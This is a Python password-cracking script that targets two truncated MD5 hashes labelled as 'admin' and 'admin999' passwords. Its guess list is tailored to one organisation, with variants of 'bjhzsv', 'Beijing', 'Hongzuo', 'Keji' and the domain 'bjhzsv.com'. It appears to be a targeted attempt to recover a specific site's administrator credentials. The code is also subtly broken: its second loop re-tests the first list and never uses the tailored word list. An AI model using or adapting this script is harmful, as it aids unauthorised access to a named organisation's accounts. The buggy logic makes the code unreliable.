import hashlib, sys

target = "2d9d5942943a1323"
target999 = "79dca16741891333"

def check(pwd, target_hash):
    md5 = hashlib.md5(pwd.encode()).hexdigest()
    return md5[8:24] == target_hash

# Try: hash itself as password
candidates = [
    "2d9d5942943a1323",
    "2d9d5942",
    "943a1323",
    "2d9d",
    "5942943a",
    "79dca16741891333",
    "79dca167",
    "41891333",
]

for c in candidates:
    if check(c, target):
        print(f"FOUND! admin password: {c}")
        sys.exit(0)
    if check(c, target999):
        print(f"FOUND! admin999 password: {c}")
        sys.exit(0)

# Try: common English words with capitalization
words = ["Admin", "ADMIN", "Password", "PASSWORD", "Passw0rd", "PASSW0RD",
         "Beijing", "BEIJING", "Tenglong", "TENGLONG",
         "BjhZsv", "BJhzsv", "BjHzSv", "BJHS", "BJHSKJ", "BJHSKJGS",
         "Hongzuo", "HONGZUO", "HongShengJia", "HongSheng",
         "Server", "SERVER", "WebAdmin", "Webadmin",
         "AspAdmin", "ASPAdmin", "IISAdmin",
         "Welcome", "Welcome1", "Welcome123", "Welcome@123",
         "Hello", "Hello123", "HelloWorld",
         "Master", "Master123",
         "Changeme", "ChangeMe", "changeme123",
         "Letmein", "Letmein123",
         # 2-word combos
         "bjhzsv2024!", "bjhzsv2024@", "bjhzsv2024#",
         "Beijing2024!", "Beijing2024@", "Beijing2024#",
         "admin2024!", "admin2024@", "admin2024#",
         # Pinyin with capitalization
         "Guanliyuan", "Guanliyuan123",
         "Yonghu", "Yonghu123",
         "Keji", "Keji123", "Keji2024", "Keji!@#",
         "HongzuoKeji", "HongzuoKeji123",
         "BeiJingHongZuo",
         # Special
         "admin!@#$%", "admin123!@#", "admin!@#123",
         "pass@word", "pass#word",
         "bjhzsv!@#", "bjhzsv@123",
         # Numbers
         "123456789", "1234567890",
         "00000000", "88888888",
         # Domain-like
         "bjhzsv.com", "www.bjhzsv.com",
         "bjhzsvcom", "wwwbjhzsvcom",
]
for c in candidates:
    if check(c, target):
        print(f"FOUND! admin password: {c}")
        sys.exit(0)
    if check(c, target999):
        print(f"FOUND! admin999 password: {c}")
        sys.exit(0)

print("Not found", file=sys.stderr)
for t in ["Guanliyuan", "bjhzsv.com", "admin2024!", "Beijing2024"]:
    m = hashlib.md5(t.encode()).hexdigest()
    print(f"  {t}: {m[8:24]}")
